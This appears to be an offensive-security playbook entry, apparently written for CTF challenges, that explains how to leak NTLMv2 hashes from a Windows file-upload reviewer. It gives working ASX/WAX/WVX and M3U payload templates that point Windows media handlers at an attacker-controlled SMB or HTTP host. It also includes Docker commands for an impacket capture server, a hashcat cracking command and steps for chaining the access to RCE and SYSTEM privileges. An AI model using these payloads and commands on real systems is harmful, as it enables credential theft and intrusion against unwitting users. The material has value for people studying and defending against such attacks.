# File Upload — NTLM Hash Leak via Media-Player-Compatible Files

## When this applies

- Windows target hosting a web app that takes file uploads (videos, audio, photos) for asynchronous review by a human/automated reviewer.
- Reviewer process opens uploads in a default Windows handler that supports remote URI references — Windows Media Player, Microsoft Office, Photos, Outlook preview, ATL/MSXML.
- Goal: trick the reviewer into authenticating against an attacker-controlled SMB / HTTP-NTLM endpoint, capturing an NTLMv2 challenge/response that can be cracked offline.

## Working extensions (Windows Media Player–compatible)

`ntlm_theft` (Greenwolf) generates ~21 file types. The **WMP-class** trio:

| Extension | Format | Reliability |
|-----------|--------|-------------|
| `.asx` (Active Stream Redirector) | XML (`<ASX>`/`<ENTRY>`/`<REF HREF=...>`) | **Reliable** — autoplay on open, supports `file://` and UNC HREF, leaks via SMB. |
| `.wax` (Windows Media Audio metafile) | XML (same as ASX) | Reliable on most builds. |
| `.wvx` (Windows Media Video metafile) | XML (same as ASX) | Reliable on most builds. |
| `.m3u` (M3U playlist) | Plain text, one URL per line | Sometimes works (depends on default handler). |

When a challenge hint says "only two of three generated extensions trigger", the most reliable single answer in field-tested cases has been `.asx` — try it first. Test the trio empirically per target.

## Payload templates

```xml
<!-- payload.asx / payload.wax / payload.wvx -->
<ASX VERSION="3.0">
  <ENTRY>
    <TITLE>Test</TITLE>
    <REF HREF="file://<ATTACKER_VPN_IP>/pub/track.mp3" />
  </ENTRY>
</ASX>
```

```text
# payload.m3u
\\<ATTACKER_VPN_IP>\pub\track.mp3
```

`file://<ip>/share/file` is parsed by Windows as `\\<ip>\share\file` and triggers SMB authentication; if the share requires NTLM, WMP responds with a Negotiate / NTLMv2 round-trip.

## Capture stack — macOS-friendly with Docker

The blocker on attacker macOS is binding port 445 — `responder` and `impacket-smbserver` both need root for that, and Docker Desktop's port publishing skips that requirement. Same trick works on Linux when you don't have root but Docker is available.

```bash
mkdir -p /tmp/share
docker run --rm -d --name smb \
  -p 445:445 \
  -v /tmp/share:/share \
  rflathers/impacket smbserver.py -smb2support -debug pub /share

# tail logs while you upload payload files
docker logs -f smb
```

The first `[*] Incoming connection (...)` confirms reachability. **Crucial:** if SMB connections come in but no `AUTHENTICATE_MESSAGE` lines appear, you're missing `-smb2support` — Windows clients hang up after SMB1-only negotiation. With `-smb2support`, expect lines like:

```
[*] AUTHENTICATE_MESSAGE (<DOMAIN>\<user>,<DOMAIN>)
[*] <user>::<DOMAIN>:4141414141414141:<NT-proof-hash>:0101000...
```

## Cracking

```bash
# Save one captured hash (full line, one per file)
echo '<user>::<DOMAIN>:4141...:0101...' > captured.hash
hashcat -m 5600 captured.hash rockyou.txt --quiet
```

Mode 5600 = NetNTLMv2; `rockyou.txt` hits most "speak-like-a-human" challenge passwords.

## Iteration tips

- **Trigger schedule.** Reviewer bots usually run every 1–5 minutes. Upload, then watch the SMB log for ~120s before assuming the wrong extension.
- **Per-extension testing.** Upload one extension at a time and tail the docker logs to attribute the hash to the trigger. The challenge's guided-mode hint ("Only two of three work reliably") implies a deliberate filter — confirm empirically before submitting.
- **Hash collision noise.** `impacket smbserver.py -debug` may also log probes from your own host (Docker NAT gateway `192.168.65.1` is the source IP after macOS Docker bridging). Filter to `AUTHENTICATE_MESSAGE` lines for actual NTLM hashes.
- **HTTP-NTLM fallback.** If port 445 is filtered between the VPN and your container, but port 80/8080 is open, switch `<REF HREF>` to `http://attacker:8080/x.mp3` and run `responder -wW` (HTTP NTLM challenge). Modern Windows still authenticates against unverified HTTP origins for media handlers.

## Common gotchas

- **Test connectivity from the *target's* perspective, not the host's.** macOS routes `nc -vz <utun-ip> 445` to PPP and times out even when the bound socket is reachable from outside. Trust the inbound log entries on the smbserver, not localhost probes.
- **Don't reset the smbserver mid-engagement** — every restart re-randomizes the SMB challenge, invalidating any captured hashes you haven't already saved.
- **Filter-sanitization on the upload handler may rewrite the filename, not strip the extension.** A typical PHP `preg_replace("/[^a-zA-Z0-9._]/", "", $original)` is character-class sanitization — `payload.asx` survives because dot is in the allow set. Confirm by reading the handler source after foothold.

## Combos

- **+ NTFS Junction Write Redirect**: After cracking the leaked hash and getting an SSH foothold as the reviewer, junction the predictable upload directory to the web root for arbitrary file-write → RCE. See [`ntfs-junction-write-redirect.md`](ntfs-junction-write-redirect.md).
- **+ FullPowers + Potato chain**: When the resulting webshell runs as a stripped LOCAL SERVICE (no SeImpersonate but has SeTcb), the FullPowers→GodPotato chain restores the privilege and elevates to SYSTEM. See [potatoes-sanity-check.md](../../../../system/reference/scenarios/windows-privesc/potatoes-sanity-check.md).
